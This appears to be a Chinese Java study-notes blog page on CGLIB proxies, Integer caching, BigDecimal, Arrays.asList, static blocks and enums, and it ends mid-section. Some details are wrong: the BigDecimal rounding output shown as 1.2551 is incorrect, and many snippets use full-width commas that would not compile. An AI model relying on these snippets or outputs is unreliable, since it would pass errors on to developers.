<h3 id="CGLIB动态代理机制"><a href="#CGLIB动态代理机制" class="headerlink" title="CGLIB动态代理机制"></a>CGLIB动态代理机制</h3><p>JDK动态代理有一个最致命的问题是其只能代理实现了接口的类。可以使用CGLIB动态代理机制来避免。</p>
<p>CGLIB（Code Generation Library）是一个基于ASM的字节码生成库，它允许在运行时对字节码进行修改和动态生成。CGLIB 通过继承方式实现代理。很多知名的开源框架都使用到了CGLIB， 例如 Spring 中的 AOP 模块中：如果目标对象实现了接口，则默认采用 JDK 动态代理，否则采用 CGLIB 动态代理。</p>
<p>在 CGLIB 动态代理机制中 MethodInterceptor 接口和 Enhancer 类是核心。</p>
<p>需要自定义 MethodInterceptor 并重写 intercept 方法，intercept 用于拦截增强被代理类的方法。</p>
<ol>
<li>定义一个类；</li>
<li>自定义 MethodInterceptor 并重写 intercept 方法，intercept 用于拦截增强被代理类的方法，和 JDK 动态代理中的 invoke 方法类似；</li>
<li>通过 Enhancer 类的 create()创建代理类。</li>
</ol>
<p>不同于 JDK 动态代理不需要额外的依赖。CGLIB（Code Generation Library）实际是属于一个开源项目，如果要使用话，需要手动添加相关依赖。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1.实现一个使用阿里云发送短信的类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> github.javaguide.dynamicProxy.cglibDynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliSmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.自定义 MethodInterceptor（方法拦截器）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodProxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义MethodInterceptor</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DebugMethodInterceptor</span> <span class="keyword">implements</span> <span class="title class_">MethodInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> o           被代理的对象（需要增强的对象）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method      被拦截的方法（需要增强的方法）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args        方法入参</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodProxy 用于调用原始方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object o， Method method， Object[] args， MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> methodProxy.invokeSuper(o， args);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.获取代理类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.Enhancer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CglibProxyFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建动态代理增强类</span></span><br><span class="line">        <span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">        <span class="comment">// 设置类加载器</span></span><br><span class="line">        enhancer.setClassLoader(clazz.getClassLoader());</span><br><span class="line">        <span class="comment">// 设置被代理类</span></span><br><span class="line">        enhancer.setSuperclass(clazz);</span><br><span class="line">        <span class="comment">// 设置方法拦截器</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">DebugMethodInterceptor</span>());</span><br><span class="line">        <span class="comment">// 创建代理类</span></span><br><span class="line">        <span class="keyword">return</span> enhancer.create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4.实际使用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AliSmsService</span> <span class="variable">aliSmsService</span> <span class="operator">=</span> (AliSmsService) CglibProxyFactory.getProxy(AliSmsService.class);</span><br><span class="line">aliSmsService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="JDK动态代理和CGLIB动态代理对比"><a href="#JDK动态代理和CGLIB动态代理对比" class="headerlink" title="JDK动态代理和CGLIB动态代理对比"></a>JDK动态代理和CGLIB动态代理对比</h3><ul>
<li><p><strong>JDK 动态代理只能只能代理实现了接口的类或者直接代理接口，而 CGLIB 可以代理未实现任何接口的类。</strong> 另外， CGLIB 动态代理是通过生成一个被代理类的子类来拦截被代理类的方法调用，因此不能代理声明为 final 类型的类和方法。</p>
</li>
<li><p>就二者的效率来说，大部分情况都是 JDK 动态代理更优秀，随着 JDK 版本的升级，这个优势更加明显。</p>
</li>
</ul>
<h3 id="动态代理和静态代理的对比"><a href="#动态代理和静态代理的对比" class="headerlink" title="动态代理和静态代理的对比"></a>动态代理和静态代理的对比</h3><ul>
<li><p><strong>灵活性</strong>：动态代理更加灵活，不需要必须实现接口，可以直接代理实现类，并且可以不需要针对每个目标类都创建一个代理类。另外，静态代理中，接口一旦新增加方法，目标对象和代理对象都要进行修改，这是非常麻烦的。</p>
</li>
<li><p><strong>JVM 层面</strong>：静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。而动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。</p>
</li>
</ul>
<h2 id="整型包装类"><a href="#整型包装类" class="headerlink" title="整型包装类"></a>整型包装类</h2><ul>
<li><p>所有整型包装类对象值的比较必须使用equals方法。</p>
</li>
<li><p>所有的 POJO 类属性必须使用包装数据类型。</p>
</li>
<li><p>RPC 方法的返回值和参数必须使用包装数据类型。</p>
</li>
<li><p>所有的局部变量使用基本数据类型。</p>
</li>
</ul>
<p>例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">System.out.println(x == y);<span class="comment">// true</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">3</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">3</span>);</span><br><span class="line">System.out.println(a == b);<span class="comment">//false</span></span><br><span class="line">System.out.println(a.equals(b));<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>当使用自动装箱方式创建一个Integer对象时，当数值在-128 ~127时，会将创建的 Integer 对象缓存起来，当下次再出现该数值时，直接从缓存中取出对应的Integer对象。所以上述代码中，x和y引用的是相同的Integer对象。 </p>
<p><strong>注意：</strong> 如果你的IDE（IDEA&#x2F;Eclipse）上安装了阿里巴巴的p3c插件，这个插件如果检测到你用 &#x3D;&#x3D; 的话会报错提示。</p>
<h2 id="BigDecimal"><a href="#BigDecimal" class="headerlink" title="BigDecimal"></a>BigDecimal</h2><p>在使用BigDecimal时，为了防止精度丢失，推荐使用它的 <strong>BigDecimal(String)</strong> 构造方法来创建对象。</p>
<p>BigDecimal 主要用来操作（大）浮点数，BigInteger 主要用来操作大整数（超过 long 类型）。</p>
<p>BigDecimal 的实现利用到了 BigInteger， 所不同的是 BigDecimal 加入了小数位的概念</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1.0f</span> - <span class="number">0.9f</span>;</span><br><span class="line"><span class="type">float</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0.9f</span> - <span class="number">0.8f</span>;</span><br><span class="line">System.out.println(a);<span class="comment">// 0.100000024</span></span><br><span class="line">System.out.println(b);<span class="comment">// 0.099999964</span></span><br><span class="line">System.out.println(a == b);<span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.9&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.8&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">x</span> <span class="operator">=</span> a.subtract(b); </span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">y</span> <span class="operator">=</span> b.subtract(c); </span><br><span class="line">System.out.println(x); <span class="comment">/* 0.1 */</span></span><br><span class="line">System.out.println(y); <span class="comment">/* 0.1 */</span></span><br><span class="line">System.out.println(Objects.equals(x， y)); <span class="comment">/* true */</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.9&quot;</span>);</span><br><span class="line">System.out.println(a.compareTo(b));<span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.255433&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">n</span> <span class="operator">=</span> m.setScale(<span class="number">3</span>，BigDecimal.ROUND_HALF_DOWN);</span><br><span class="line">System.out.println(n);<span class="comment">// 1.2551</span></span><br></pre></td></tr></table></figure>

<h2 id="Arrays-asList"><a href="#Arrays-asList" class="headerlink" title="Arrays.asList()"></a>Arrays.asList()</h2><p>Arrays.asList()将数组转换为集合后，底层其实还是数组。</p>
<p>Arrays.asList()是泛型方法，传入的对象必须是对象数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] myArray = &#123;<span class="number">1</span>， <span class="number">2</span>， <span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(myArray);</span><br><span class="line">System.out.println(myList.size());<span class="comment">//1</span></span><br><span class="line">System.out.println(myList.get(<span class="number">0</span>));<span class="comment">//数组地址值</span></span><br><span class="line">System.out.println(myList.get(<span class="number">1</span>));<span class="comment">//报错：ArrayIndexOutOfBoundsException</span></span><br><span class="line"><span class="type">int</span>[] array = (<span class="type">int</span>[]) myList.get(<span class="number">0</span>);</span><br><span class="line">System.out.println(array[<span class="number">0</span>]);<span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>当传入一个原生数据类型数组时，<code>Arrays.asList()</code> 的真正得到的参数就不是数组中的元素，而是数组对象本身，此时List 的唯一元素就是这个数组，这也就解释了上面的代码。</p>
<p>使用包装类型数组就可以解决这个问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer[] myArray = &#123;<span class="number">1</span>， <span class="number">2</span>， <span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>使用集合的修改方法:add()、remove()、clear()会抛出异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(<span class="number">1</span>， <span class="number">2</span>， <span class="number">3</span>);</span><br><span class="line">myList.add(<span class="number">4</span>);<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br><span class="line">myList.remove(<span class="number">1</span>);<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br><span class="line">myList.clear();<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br></pre></td></tr></table></figure>

<p>Arrays.asList() 方法返回的并不是 java.util.ArrayList ，而是 java.util.Arrays 的一个内部类，这个内部类并没有实现集合的修改方法或者说并没有重写这些方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(<span class="number">1</span>， <span class="number">2</span>， <span class="number">3</span>);</span><br><span class="line">System.out.println(myList.getClass());<span class="comment">//class java.util.Arrays$ArrayList</span></span><br></pre></td></tr></table></figure>

<p>java.util.Arrays$ArrayList的简易源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ArrayList</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractList</span>&lt;E&gt;</span><br><span class="line">      <span class="keyword">implements</span> <span class="title class_">RandomAccess</span>， java.io.Serializable</span><br><span class="line">  &#123;</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index， E element)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">         ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; action)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">replaceAll</span><span class="params">(UnaryOperator&lt;E&gt; operator)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; c)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>再看一下java.util.AbstractList的remove()方法，这样就明白为啥会抛出UnsupportedOperationException。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="如何正确的将数组转换为ArrayList"><a href="#如何正确的将数组转换为ArrayList" class="headerlink" title="如何正确的将数组转换为ArrayList?"></a>如何正确的将数组转换为ArrayList?</h3><p><strong>1.自己动手实现</strong></p>
<p><strong>2.最简便的方法(推荐)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;a&quot;</span>， <span class="string">&quot;b&quot;</span>，<span class="string">&quot;c&quot;</span>));</span><br></pre></td></tr></table></figure>

<p><strong>3. 使用 Java8 的Stream(推荐)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer [] myArray = &#123; <span class="number">1</span>， <span class="number">2</span>， <span class="number">3</span> &#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.stream(myArray).collect(Collectors.toList());</span><br><span class="line"><span class="comment">//基本类型也可以实现转换（依赖boxed的装箱操作）</span></span><br><span class="line"><span class="type">int</span> [] myArray2 = &#123; <span class="number">1</span>， <span class="number">2</span>， <span class="number">3</span> &#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.stream(myArray2).boxed().collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

<p><strong>4. 使用 Guava(推荐)</strong></p>
<p>对于不可变集合，你可以使用ImmutableList类及其of()与copyOf()工厂方法：（参数不能为空）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; il = ImmutableList.of(<span class="string">&quot;string&quot;</span>， <span class="string">&quot;elements&quot;</span>);  <span class="comment">// from varargs</span></span><br><span class="line">List&lt;String&gt; il = ImmutableList.copyOf(aStringArray);      <span class="comment">// from array</span></span><br></pre></td></tr></table></figure>

<p>对于可变集合，你可以使用Lists类及其newArrayList()工厂方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; l1 = Lists.newArrayList(anotherListOrCollection);    <span class="comment">// from collection</span></span><br><span class="line">List&lt;String&gt; l2 = Lists.newArrayList(aStringArray);               <span class="comment">// from array</span></span><br><span class="line">List&lt;String&gt; l3 = Lists.newArrayList(<span class="string">&quot;or&quot;</span>， <span class="string">&quot;string&quot;</span>， <span class="string">&quot;elements&quot;</span>); <span class="comment">// from varargs</span></span><br></pre></td></tr></table></figure>

<p><strong>5. 使用 Apache Commons Collections</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">CollectionUtils.addAll(list， str);</span><br></pre></td></tr></table></figure>

<p><strong>6. 使用 Java9 的 <code>List.of()</code>方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer[] array = &#123;<span class="number">1</span>， <span class="number">2</span>， <span class="number">3</span>&#125;;</span><br><span class="line">List&lt;Integer&gt; list = List.of(array);</span><br><span class="line">System.out.println(list); <span class="comment">/* [1， 2， 3] */</span></span><br><span class="line"><span class="comment">/* 不支持基本数据类型 */</span></span><br></pre></td></tr></table></figure>

<h3 id="Collection-toArray-方法使用的坑-amp-如何反转数组"><a href="#Collection-toArray-方法使用的坑-amp-如何反转数组" class="headerlink" title="Collection.toArray()方法使用的坑&amp;如何反转数组"></a>Collection.toArray()方法使用的坑&amp;如何反转数组</h3><p>该方法是一个泛型方法：<code>&lt;T&gt; T[] toArray(T[] a);</code> 如果<code>toArray</code>方法中没有传递任何参数的话返回的是<code>Object</code>类型数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] s= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">    <span class="string">&quot;dog&quot;</span>， <span class="string">&quot;lazy&quot;</span>， <span class="string">&quot;a&quot;</span>， <span class="string">&quot;over&quot;</span>， <span class="string">&quot;jumps&quot;</span>， <span class="string">&quot;fox&quot;</span>， <span class="string">&quot;brown&quot;</span>， <span class="string">&quot;quick&quot;</span>， <span class="string">&quot;A&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">List&lt;String&gt; list = Arrays.asList(s);</span><br><span class="line">Collections.reverse(list);</span><br><span class="line">s=list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);<span class="comment">//没有指定类型的话会报错</span></span><br></pre></td></tr></table></figure>

<p>由于JVM优化，<code>new String[0]</code>作为<code>Collection.toArray()</code>方法的参数现在使用更好，<code>new String[0]</code>就是起一个模板的作用，指定了返回数组的类型，0是为了节省空间，因为它只是为了说明返回的类型。详见：<a href="https://shipilev.net/blog/2016/arrays-wisdom-ancients/">https://shipilev.net/blog/2016/arrays-wisdom-ancients/</a></p>
<h3 id="不要在-foreach-循环里进行元素的-remove-x2F-add-操作"><a href="#不要在-foreach-循环里进行元素的-remove-x2F-add-操作" class="headerlink" title="不要在 foreach 循环里进行元素的 remove&#x2F;add 操作"></a>不要在 foreach 循环里进行元素的 remove&#x2F;add 操作</h3><p>如果要进行remove操作，可以调用迭代器的 remove方法而不是集合类的 remove 方法。因为如果列表在任何时间从结构上修改创建迭代器之后，以任何方式除非通过迭代器自身remove&#x2F;add方法，迭代器都将抛出一个ConcurrentModificationException，这就是单线程状态下产生的 fail-fast 机制。</p>
<blockquote>
<p>fail-fast 机制：多个线程对 fail-fast 集合进行修改的时，可能会抛出ConcurrentModificationException，单线程下也会出现这种情况，上面已经提到过。</p>
</blockquote>
<p>Java8开始，可以使用Collection#removeIf()方法删除满足特定条件的元素，如 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    list.add(i);</span><br><span class="line">&#125;</span><br><span class="line">list.removeIf(filter -&gt; filter % <span class="number">2</span> == <span class="number">0</span>); <span class="comment">/* 删除list中的所有偶数 */</span></span><br><span class="line">System.out.println(list); <span class="comment">/* [1， 3， 5， 7， 9] */</span></span><br></pre></td></tr></table></figure>

<p><code>java.util</code>包下面的所有的集合类都是fail-fast的，而<code>java.util.concurrent</code>包下面的所有的类都是fail-safe的。</p>
<h2 id="final，static，this，super关键字"><a href="#final，static，this，super关键字" class="headerlink" title="final，static，this，super关键字"></a>final，static，this，super关键字</h2><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><ol>
<li>静态内部类（static修饰类的话只能修饰内部类）： 静态内部类与非静态内部类之间存在一个最大的区别: 非静态内部类在编译完成之后会隐含地保存着一个引用，该引用是指向创建它的外围类，但是静态内部类却没有。没有这个引用就意味着：1. 它的创建是不需要依赖外围类的创建。2. 它不能使用任何外围类的非static成员变量和方法。</li>
<li>静态导包（用来导入类中的静态资源，1.5之后的新特性）：格式为：import static 这两个关键字连用可以指定导入某个类中的指定静态资源，并且不需要使用类名调用类中静态成员，可以直接使用类中静态成员变量和成员方法。</li>
</ol>
<h3 id="this和super的区别"><a href="#this和super的区别" class="headerlink" title="this和super的区别"></a>this和super的区别</h3><ul>
<li>不可以在static环境中用；</li>
<li>this是一个指向本对象的指针；</li>
<li>super是一个java关键字都需要放到方法的第一行；</li>
<li>this和super不能同时出现在一个构造函数里面，因为this必然会调用其他的构造函数，其他的构造函数必然会有super语句的存在。</li>
</ul>
<h3 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h3><p>定义在类中方法外，静态代码块在非静态代码块之前执行（静态代码块 - 非静态代码块 - 构造方法）。 该类不管创建多少对象，静态代码块只执行一次。一个类中可以有多个静态代码块，位置可以随便放，它不在任何的方法体内，JVM加载类时会执行这些静态代码块，如果静态代码块有多个，JVM将按它们的先后顺序执行，每个代码块只会执行一次。</p>
<p><strong>静态代码块对于定义在它之后的静态变量，可以赋值，但不能访问.</strong></p>
<p>静态代码块可能在第一次new的时候执行，但不一定只在第一次new的时候执行。比如通过 <code>Class.forName(&quot;ClassDemo&quot;)</code>创建 Class 对象的时候也会执行。</p>
<p>非静态代码块在每new一次就执行一次。 非静态代码块可在普通方法中定义（不过作用不大）；而静态代码块不行。</p>
<p>一般情况下，如果有些代码比如一些项目最常用的变量或对象必须在项目启动的时候就执行的时候，需要使用静态代码块，这种代码是主动执行的。如果想要设计不需要创建对象就可以调用类中的方法，例如：Arrays类，Character类，String类等，就需要使用静态方法， 两者的区别是静态代码块是自动执行的而静态方法是被调用的时候才执行的。</p>
<h2 id="Java内存泄漏"><a href="#Java内存泄漏" class="headerlink" title="Java内存泄漏"></a>Java内存泄漏</h2><p>长生命周期的对象持有短生命周期对象的引用就很可能发生内存泄露，尽管短生命周期对象已经不再需要，但是因为长生命周期对象持有它的引用而导致不能被回收，例如threadLocal，这就是Java中内存泄露的发生场景。</p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>Reference：<a href="https://www.baeldung.com/a-guide-to-java-enums">https://www.baeldung.com/a-guide-to-java-enums</a> </p>
<p><strong>以这种方式定义的常量使代码更具可读性，允许进行编译时检查，预先记录可接受值的列表，并避免由于传入无效值而引起的意外行为。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shuang.kou.enumdemo.enumtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PizzaStatus</span> &#123;</span><br><span class="line">    ORDERED，</span><br><span class="line">    READY， </span><br><span class="line">    DELIVERED; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 简单来说，通过上面的代码避免了定义常量，将所有和 pizza 订单的状态的常量都统一放到了一个枚举类型里面。</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.name());<span class="comment">//ORDERED</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED);<span class="comment">//ORDERED</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.name().getClass());<span class="comment">//class java.lang.String</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.getClass());<span class="comment">//class shuang.kou.enumdemo.enumtest.PizzaStatus</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="自定义枚举方法"><a href="#自定义枚举方法" class="headerlink" title="自定义枚举方法"></a>自定义枚举方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pizza</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> PizzaStatus status;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PizzaStatus</span> &#123;</span><br><span class="line">        ORDERED，</span><br><span class="line">        READY，</span><br><span class="line">        DELIVERED;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isDeliverable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getStatus() == PizzaStatus.READY;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// Methods that set and get the status variable.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用-x3D-x3D-比较枚举类型"><a href="#使用-x3D-x3D-比较枚举类型" class="headerlink" title="使用&#x3D;&#x3D;比较枚举类型"></a>使用&#x3D;&#x3D;比较枚举类型</h3><p>由于枚举类型确保JVM中仅存在一个常量实例，因此可以安全地使用 <code>==</code> 运算符比较两个变量，如上例所示；此外，<code>==</code> 运算符可提供编译时和运行时的安全性。</p>
<p>如果两个值均为null 都不会引发 NullPointerException。相反，如果使用equals方法，将抛出 NullPointerException：</p>
